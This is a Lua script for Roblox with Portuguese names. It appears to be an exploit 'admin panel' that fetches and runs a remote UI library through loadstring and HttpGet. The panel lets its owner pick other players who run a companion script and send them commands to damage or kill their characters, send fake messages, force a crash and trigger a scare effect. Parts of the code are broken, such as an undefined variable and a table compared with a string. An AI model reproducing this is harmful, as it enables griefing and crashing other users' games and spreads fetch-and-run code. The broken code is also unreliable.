local DONO_USERID = 2980742903
local Players = game:GetService("Players")
local jogador = Players.LocalPlayer
local RobloxReplicatedStorage = game:GetService("RobloxReplicatedStorage")

if jogador.UserId ~= DONO_USERID then jogador:Kick("Acesso negado.") return end

local PonteOrdens = RobloxReplicatedStorage:FindFirstChild("OrvexNetworkComms") or Instance.new("StringValue", RobloxReplicatedStorage)
PonteOrdens.Name = "OrvexNetworkComms"
PonteOrdens.Value = ""

local ListaAtivos = RobloxReplicatedStorage:FindFirstChild("OrvexActiveClients") or Instance.new("StringValue", RobloxReplicatedStorage)
ListaActive.Name = "OrvexActiveClients"

local usuarioSelecionadoTroll = ""
local textoFakeMensagem = ""

local function obterListaJogadoresDedicada()
    if ListaAtivos.Value == "" then return {"Nenhum usuário detectado"} end
    local brutos = string.split(ListaAtivos.Value, ",")
    local validados = {}
    for _, nome in ipairs(brutos) do
        if Players:FindFirstChild(nome) and not table.find(validados, nome) then
            table.insert(validados, nome)
        end
    end
    if #validados == 0 then return {"Nenhum usuário detectado"} end
    return validados
end

local function enviarComandoRede(cmd, arg)
    if usuarioSelecionadoTroll ~= "" and usuarioSelecionadoTroll ~= "Nenhum usuário detectado" then
        PonteOrdens.Value = string.format("%s|%s|%s|%s", usuarioSelecionadoTroll, cmd, arg, tostring(os.clock()))
    end
end

local Rayfield = loadstring(game:HttpGet("https://sirius.menu/gen2"))()
local Window = Rayfield:CreateWindow({Name = "ORVEX | ADMIN PAINEL", Subtitle = "Painel Silencioso", Theme = "Default"})
local TabMonitor = Window:CreateTab({ Name = "Monitor", Icon = "rbxassetid://100604009889706" })
local TabTroll = Window:CreateTab({ Name = "Troll", Icon = "rbxassetid://10651147057" })

TabMonitor:CreateSection({ Name = "Monitoramento Direto de Memória" })
local LabelContador = TabMonitor:CreateText({ Name = "Contador", Text = "Usuários com script ativo: 0" })
local LabelLista = TabMonitor:CreateText({ Name = "Usuários Online", Text = "Sincronizando..." })

local DropdownTroll = TabTroll:CreateDropdown({
    Name = "Selecionar Alvo da Rede",
    Options = obterListaJogadoresDedicada(),
    CurrentOption = "",
    MultipleOptions = false,
    Callback = function(opcao) usuarioSelecionadoTroll = opcao end
})

TabTroll:CreateButton({Name = "Reduzir Vitalidade", Callback = function() enviarComandoRede("Danificar", "25") end})
TabTroll:CreateButton({Name = "Eliminar Personagem", Callback = function() enviarComandoRede("Danificar", "0") end})

TabTroll:CreateInput({Name = "Texto Fake", PlaceholderText = "Escreva aqui...", Callback = function(t) textoFakeMensagem = t end})
TabTroll:CreateButton({Name = "Enviar Mensagem Simulada", Callback = function() enviarComandoRede("FakeMessage", textoFakeMensagem) end})
TabTroll:CreateButton({Name = "Provocar Travamento (Crash)", Callback = function() enviarComandoRede("ForcarCrash", "true") end})
TabTroll:CreateToggle({Name = "Efeito Susto", CurrentValue = false, Callback = function(v) enviarComandoRede("EfeitoSusto", v and "ATIVAR" or "DESATIVAR") end})

-- Loop de atualização assíncrona constante com atualização visual forçada na aba Troll
task.spawn(function()
    while task.wait(1.5) do
        pcall(function()
            local ativos = obterListaJogadoresDedicada()
            DropdownTroll:Refresh(ativos, true)
            if ativos == "Nenhum usuário detectado" then
                LabelContador:Set("Usuários com script ativo: 0")
                LabelLista:Set("Online: Nenhum")
            else
                LabelContador:Set("Usuários com script ativo: " .. #ativos)
                LabelLista:Set("Online: " .. table.concat(ativos, ", "))
            end
        end)
    end
end)
